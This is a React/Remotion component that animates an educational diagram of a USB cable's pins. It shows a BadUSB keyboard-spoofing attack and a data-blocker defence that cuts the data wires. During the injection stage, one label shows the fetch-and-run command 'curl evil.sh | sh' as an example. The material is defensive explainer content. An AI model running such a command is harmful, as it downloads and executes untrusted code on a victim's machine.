import { useCurrentFrame } from "remotion";
import { Icon } from "../../icons/Icons";
import { TX } from "../../layout";
import { C, easeOut, materialize, mono, prog, sans } from "../../theme";
import { DevCard, TAB_H } from "../dev/card";
import { GREEN, lerp, presence, RED } from "../diagram/Node";
import { tint } from "../windows/MacWindow";

const PINS = [
  { id: "VCC", sub: "+5V power", y: 78, color: "#E5484D", isData: false },
  { id: "D-", sub: "Data −", y: 156, color: C.accent, isData: true },
  { id: "D+", sub: "Data +", y: 234, color: C.accent, isData: true },
  { id: "GND", sub: "Ground", y: 312, color: "#6E6E73", isData: false },
] as const;

/**
 * Hardware USB connector cross-section & BadUSB HID spoofing diagram.
 * Shows the 4 internal USB wires (`VCC`, `D-`, `D+`, `GND`), optional hidden chip claiming
 * `deviceClaim` (e.g. `"HID Class 0x03 · Keyboard"`), rapid keystroke pulses on `D-`/`D+` at `injectAt`,
 * and physical data-pin blocking at `blockDataAt` ("Data pins blocked · Power only").
 */
export const UsbPinout: React.FC<{
  x?: number;
  y: number;
  w?: number;
  at: number;
  until?: number;
  deviceClaim?: { at: number; text: string; danger?: boolean };
  injectAt?: number;
  blockDataAt?: number;
}> = ({ x = TX, y, w = 900, at, until, deviceClaim, injectAt, blockDataAt }) => {
  const frame = useCurrentFrame();
  const vis = presence(frame, at, until);
  if (vis === null) return null;

  const isClaimed = deviceClaim !== undefined && frame >= deviceClaim.at;
  const claimP = deviceClaim !== undefined ? prog(frame, deviceClaim.at, 10, easeOut) : 0;
  const isDanger = deviceClaim?.danger ?? true;

  const isBlocked = blockDataAt !== undefined && frame >= blockDataAt;
  const blockP = blockDataAt !== undefined ? prog(frame, blockDataAt, 10, easeOut) : 0;

  const isInjecting = injectAt !== undefined && frame >= injectAt && !isBlocked;
  const injectP = injectAt !== undefined ? prog(frame, injectAt, 9, easeOut) : 0;

  const wireX1 = 236;
  const wireX2 = w - 216;
  const midX = (wireX1 + wireX2) / 2;
  const cutHalf = 54 * blockP;

  const drawWires = prog(frame, at + 4, 14, easeOut);
  const bodyH = 492;
  const totalH = TAB_H + bodyH;

  return (
    <DevCard
      x={x}
      y={y}
      w={w}
      h={totalH}
      p={vis}
      filename="USB cable · 4-pin hardware cross-section"
      icon="plug"
      right={isBlocked ? "power-only condom" : isInjecting ? "HID injection!" : "USB 2.0 bus"}
    >
      <div style={{ position: "relative", width: w, height: bodyH }}>
        {/* SVG Schematic of the 4 Wires & Pulses */}
        <svg
          width={w}
          height={390}
          viewBox={`0 0 ${w} 390`}
          style={{ position: "absolute", left: 0, top: 0, overflow: "visible" }}
        >
          {PINS.map((pin, idx) => {
            const curEnd = lerp(wireX1, wireX2, drawWires);
            const activeColor = pin.isData ? (isInjecting ? RED : C.accent) : pin.color;

            if (pin.isData && isBlocked) {
              return (
                <g key={pin.id}>
                  {/* Left half of cut data wire */}
                  <line
                    x1={wireX1}
                    y1={pin.y}
                    x2={midX - cutHalf}
                    y2={pin.y}
                    stroke="#C7C7CC"
                    strokeWidth={5}
                    strokeDasharray="8 6"
                    strokeLinecap="round"
                  />
                  {/* Right half of cut data wire (disconnected) */}
                  <line
                    x1={midX + cutHalf}
                    y1={pin.y}
                    x2={wireX2}
                    y2={pin.y}
                    stroke="#D2D2D7"
                    strokeWidth={5}
                    strokeDasharray="8 6"
                    strokeLinecap="round"
                  />
                  {/* Cut terminal caps */}
                  <circle cx={midX - cutHalf} cy={pin.y} r={6} fill={RED} />
                  <circle cx={midX + cutHalf} cy={pin.y} r={6} fill="#8E8E93" />
                </g>
              );
            }

            return (
              <g key={pin.id}>
                <line
                  x1={wireX1}
                  y1={pin.y}
                  x2={curEnd}
                  y2={pin.y}
                  stroke={activeColor}
                  strokeWidth={pin.isData && isInjecting ? 6 : 5}
                  strokeLinecap="round"
                />
                <circle cx={wireX1} cy={pin.y} r={6} fill={activeColor} />
                {drawWires >= 1 ? <circle cx={wireX2} cy={pin.y} r={6} fill={activeColor} /> : null}

                {/* Rapid keystroke injection pulses on D- and D+ */}
                {pin.isData && isInjecting
                  ? [0, 0.25, 0.5, 0.75].map((offset, pIdx) => {
                      const t = ((frame - (injectAt ?? 0)) * 0.055 + offset + idx * 0.12) % 1;
                      const px = lerp(wireX1 + 14, wireX2 - 14, t);
                      return (
                        <g key={pIdx}>
                          <circle cx={px} cy={pin.y} r={11} fill={RED} opacity={0.22} />
                          <circle cx={px} cy={pin.y} r={6.5} fill={RED} />
                        </g>
                      );
                    })
                  : null}

                {/* Steady power flow dots on VCC */}
                {pin.id === "VCC" && drawWires >= 1
                  ? [0, 0.5].map((offset, pIdx) => {
                      const t = ((frame - at) * 0.02 + offset) % 1;
                      const px = lerp(wireX1 + 14, wireX2 - 14, t);
                      return <circle key={pIdx} cx={px} cy={pin.y} r={5} fill="#E5484D" opacity={0.65} />;
                    })
                  : null}
              </g>
            );
          })}
        </svg>

        {/* Pin Labels along the wires */}
        {PINS.map((pin) => {
          const isData = pin.isData;
          const badgeColor = isData ? (isBlocked ? C.mute : isInjecting ? "#C9281E" : C.accent) : pin.color;
          const badgeBg = isData
            ? isBlocked
              ? "#F2F2F4"
              : isInjecting
                ? "#FFF1F0"
                : "#EBF4FF"
            : pin.id === "VCC"
              ? "rgba(229,72,77,0.12)"
              : "#F2F2F4";

          return (
            <div
              key={pin.id}
              style={{
                position: "absolute",
                left: wireX1 + 22,
                top: pin.y - 34,
                display: "flex",
                alignItems: "center",
                gap: 8,
                padding: "3px 12px",
                borderRadius: 8,
                background: badgeBg,
                border: `1px solid ${C.line}`,
              }}
            >
              <span style={{ fontFamily: mono, fontWeight: 700, fontSize: 17, color: badgeColor }}>{pin.id}</span>
              <span style={{ fontFamily: sans, fontWeight: 500, fontSize: 15, color: C.mute }}>{pin.sub}</span>
            </div>
          );
        })}

        {/* Left: USB Cable Plug Housing */}
        <div
          style={{
            position: "absolute",
            left: 24,
            top: 38,
            width: wireX1 - 24,
            height: 314,
            borderRadius: 22,
            background: isClaimed && isDanger ? "#FFF5F5" : "#F5F5F7",
            border: `2px solid ${isClaimed && isDanger ? RED : C.line}`,
            display: "flex",
            flexDirection: "column",
            alignItems: "center",
            justifyContent: "center",
            padding: "16px 14px",
            gap: 12,
            ...materialize(prog(frame, at + 2, 10)),
          }}
        >
          <div
            style={{
              width: 66,
              height: 66,
              borderRadius: 18,
              background: isClaimed ? (isDanger ? tint(RED, 0.14) : "#EBF4FF") : C.white,
              border: `1.5px solid ${isClaimed ? (isDanger ? RED : C.accent) : C.line}`,
              display: "flex",
              alignItems: "center",
              justifyContent: "center",
            }}
          >
            <Icon
              name={isClaimed ? "chip" : "plug"}
              size={38}
              color={isClaimed ? (isDanger ? "#C9281E" : C.accent) : C.ink}
              weight={2.1}
            />
          </div>
          <div style={{ textAlign: "center" }}>
            <div style={{ fontFamily: sans, fontWeight: 700, fontSize: 20, color: C.ink }}>USB plug shell</div>
            <div style={{ fontFamily: mono, fontWeight: 500, fontSize: 15, color: C.mute, marginTop: 2 }}>
              {isClaimed ? "hidden MCU inside" : "molded connector"}
            </div>
          </div>

          {/* Device Claim Callout Pill */}
          {isClaimed ? (
            <div
              style={{
                padding: "8px 12px",
                borderRadius: 12,
                background: isDanger ? RED : C.accent,
                color: C.white,
                display: "flex",
                alignItems: "center",
                gap: 7,
                fontFamily: mono,
                fontWeight: 700,
                fontSize: 14,
                textAlign: "center",
                boxShadow: "0 6px 16px rgba(255,59,48,0.24)",
                ...materialize(claimP),
              }}
            >
              <Icon name="keyboard" size={18} color={C.white} weight={2.3} />
              <span>{deviceClaim.text}</span>
            </div>
          ) : null}
        </div>

        {/* Right: Host Laptop Port */}
        <div
          style={{
            position: "absolute",
            left: wireX2,
            top: 38,
            width: w - wireX2 - 24,
            height: 314,
            borderRadius: 22,
            background: isInjecting ? "#FFF5F5" : "#F5F5F7",
            border: `2px solid ${isInjecting ? RED : isBlocked ? GREEN : C.line}`,
            display: "flex",
            flexDirection: "column",
            alignItems: "center",
            justifyContent: "center",
            padding: "16px 14px",
            gap: 12,
            ...materialize(prog(frame, at + 5, 10)),
          }}
        >
          <div
            style={{
              width: 66,
              height: 66,
              borderRadius: 18,
              background: isBlocked ? tint(GREEN, 0.15) : isInjecting ? tint(RED, 0.14) : C.white,
              border: `1.5px solid ${isBlocked ? GREEN : isInjecting ? RED : C.line}`,
              display: "flex",
              alignItems: "center",
              justifyContent: "center",
            }}
          >
            <Icon
              name="laptop"
              size={38}
              color={isBlocked ? "#248A3D" : isInjecting ? "#C9281E" : C.ink}
              weight={2.1}
            />
          </div>
          <div style={{ textAlign: "center" }}>
            <div style={{ fontFamily: sans, fontWeight: 700, fontSize: 20, color: C.ink }}>Host laptop</div>
            <div
              style={{
                fontFamily: mono,
                fontWeight: 600,
                fontSize: 15,
                color: isBlocked ? "#248A3D" : isInjecting ? "#C9281E" : C.mute,
                marginTop: 4,
              }}
            >
              {isBlocked ? "+5V charging only" : isInjecting ? "trusts new keyboard!" : "USB host controller"}
            </div>
          </div>
        </div>

        {/* Data Blocker Shield over cut D- / D+ wires */}
        {isBlocked ? (
          <div
            style={{
              position: "absolute",
              left: midX,
              top: (PINS[1].y + PINS[2].y) / 2,
              translate: "-50% -50%",
              padding: "12px 18px",
              borderRadius: 18,
              background: "#EEFAF1",
              border: `2.5px solid ${GREEN}`,
              boxShadow: "0 10px 24px rgba(52,199,89,0.20)",
              display: "flex",
              alignItems: "center",
              gap: 10,
              whiteSpace: "nowrap",
              ...materialize(blockP),
            }}
          >
            <Icon name="shieldCheck" size={28} color="#248A3D" weight={2.3} />
            <div style={{ display: "flex", flexDirection: "column" }}>
              <span style={{ fontFamily: sans, fontWeight: 700, fontSize: 17, color: "#248A3D" }}>
                Data pins blocked
              </span>
              <span style={{ fontFamily: mono, fontWeight: 600, fontSize: 14, color: "#248A3D" }}>
                D- / D+ physically cut
              </span>
            </div>
          </div>
        ) : null}

        {/* Bottom Status Banner */}
        <div
          style={{
            position: "absolute",
            left: 24,
            right: 24,
            bottom: 22,
            height: 68,
            padding: "0 22px",
            borderRadius: 16,
            background: isBlocked
              ? tint(GREEN, 0.14)
              : isInjecting
                ? tint(RED, 0.12)
                : "#F5F5F7",
            border: `2px solid ${isBlocked ? tint(GREEN, 0.45) : isInjecting ? RED : C.line}`,
            display: "flex",
            alignItems: "center",
            justifyContent: "space-between",
          }}
        >
          <div style={{ display: "flex", alignItems: "center", gap: 12 }}>
            <Icon
              name={isBlocked ? "shieldCheck" : isInjecting ? "warning" : "info"}
              size={28}
              color={isBlocked ? "#248A3D" : isInjecting ? "#C9281E" : C.accent}
              weight={2.3}
              draw={isBlocked ? blockP : isInjecting ? injectP : 1}
            />
            <span
              style={{
                fontFamily: sans,
                fontWeight: 700,
                fontSize: 20,
                color: isBlocked ? "#248A3D" : isInjecting ? "#C9281E" : C.ink,
              }}
            >
              {isBlocked
                ? "Data pins blocked · Power only (+5V safe)"
                : isInjecting
                  ? "Injecting hidden keystrokes over D- / D+"
                  : "4-wire USB bus · Power (VCC / GND) + Data (D- / D+)"}
            </span>
          </div>
          <span
            style={{
              fontFamily: mono,
              fontWeight: 700,
              fontSize: 17,
              color: isBlocked ? "#248A3D" : isInjecting ? "#C9281E" : C.mute,
            }}
          >
            {isBlocked ? "0 bps data" : isInjecting ? "curl evil.sh | sh" : "5V === 2.4A"}
          </span>
        </div>
      </div>
    </DevCard>
  );
};
